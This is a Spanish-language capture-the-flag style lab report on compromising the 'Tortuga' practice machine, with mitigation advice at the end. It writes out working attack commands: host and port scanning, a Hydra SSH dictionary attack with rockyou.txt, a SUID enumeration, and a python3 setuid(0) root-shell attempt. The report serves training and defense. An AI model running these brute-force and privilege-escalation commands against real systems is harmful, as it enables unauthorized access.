# 🐢 Informe de Laboratorio: Compromiso de "Tortuga" (The Hackers Labs - ID 131)

Este informe documenta el ejercicio de **Penetration Testing (Pentesting)** realizado sobre la máquina virtual "Tortuga". El ejercicio cubrió el flujo completo de descubrimiento de hosts, obtención de acceso mediante fuerza bruta, y la metodología de Escalada de Privilegios Local (LPE).

## 1. 📌 Resumen Ejecutivo

El objetivo fue comprometido con éxito en la fase de acceso inicial, demostrando la explotación de credenciales débiles. La fase de Escalada de Privilegios se enfocó en la enumeración de binarios SUID.

| Estado del Objetivo | Tipo de Compromiso | Vulnerabilidad Crítica | Impacto |
| :--- | :--- | :--- | :--- |
| **COMPROMETIDO** | Acceso Remoto | Contraseña Débil (SSH) | **ALTO** |

---

## 2. 🛡️ Metodología de Ataque (PTES/OSSTMM)

El ataque se ejecutó siguiendo las fases estándar de la metodología de seguridad ofensiva.

### Fase A: Reconocimiento y Obtención de Acceso

| Paso | Tarea Clave | Herramienta | Resultado |
| :--- | :--- | :--- | :--- |
| **1.** | Descubrimiento de Host | `arp-scan` | Localización rápida de la IP del objetivo en la LAN. |
| **2.** | Escaneo de Servicios | `Nmap` | Identificación de puertos abiertos (generalmente SSH y HTTP). |
| **3.** | Ingeniería de Wordlist | `cewl` | Creación de un diccionario de ataque basado en el contenido público de la web. |
| **4.** | Explotación de Credenciales | `Hydra` | Descubrimiento de credenciales válidas por fuerza bruta/diccionario (p. ej., `grumete:password_hallada`). |

### Fase B: Post-Explotación y Escalada de Privilegios

| Paso | Tarea Clave | Herramienta | Resultado y Vector |
| :--- | :--- | :--- | :--- |
| **5.** | Búsqueda de LPE | `find / -perm -4000` | Enumeración de binarios con el *bit* SUID activado, principal vector de Escalada de Privilegios Local. |
| **6.** | Intento de Shell Root | `/usr/bin/python3.11 -c 'import os; os.setuid(0)...'` | Demostración de la lógica de explotación SUID mediante manipulación de UID, aunque a menudo fallida en sistemas modernos. |

---

## 3. 🚨 Análisis de Vulnerabilidades Encontradas

### 3.1. Vulnerabilidad Alta: Contraseña de Usuario Débil

* **Vector:** Autenticación Remota (SSH).
* **Descripción:** El usuario de bajo privilegio (`grumete`) utilizaba una contraseña débil que se encontraba en diccionarios públicos (`rockyou.txt`), permitiendo un ataque de fuerza bruta exitoso y el compromiso inicial del acceso remoto.

### 3.2. Vector de Riesgo: Binarios SUID

* **Vector:** Escalada de Privilegios Local (LPE).
* **Descripción:** La existencia de múltiples binarios SUID activos en el sistema (detectados por `find -perm -4000`) requiere una auditoría estricta, ya que cualquiera de ellos podría ser el punto de apoyo para escalar privilegios si estuviera mal configurado o fuera vulnerable.

---

## 4. 📝 Recomendaciones de Seguridad (Mitigación)

Para proteger sistemas contra los vectores explotados en este laboratorio:

* **Política de Credenciales:**
    * **Eliminar** usuarios con contraseñas que figuren en diccionarios públicos.
    * **Forzar** el uso de frases de contraseña (passphrases) largas y complejas.
    * Activar la **autenticación por clave SSH** y deshabilitar el acceso por contraseña cuando sea posible.

* **Gestión de Privilegios:**
    * **Auditar y minimizar** la cantidad de binarios con el bit SUID activo.
    * Utilizar el principio de **mínimo privilegio** para todos los usuarios.

---

## 5. 💻 Apéndice: Registro Detallado de Comandos

| \# | Fase | Propósito | Comando Ejecutado |
| :--- | :--- | :--- | :--- |
| **1** | Reconocimiento | Descubrimiento de Host | `sudo arp-scan --interface=eth1 --localnet` |
| **2** | Reconocimiento | Escaneo de Servicios | `nmap 10.0.100.0/24` |
| **3** | Enumeración Web | Ingeniería de Wordlist | `cewl -w users.txt -d 1 -m 4 -e http://10.0.100.4/` |
| **4** | Obtención Acceso | Ataque de Diccionario | `hydra -l grumete -P /usr/share/wordlist/rockyou.txt ssh://10.0.100.4 -t 4` |
| **5** | Escalada | Búsqueda de Binarios SUID | `find / -perm -4000 -type f 2>/dev/null` |
| **6** | Escalada | Intento Ilustrativo de LPE | `/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
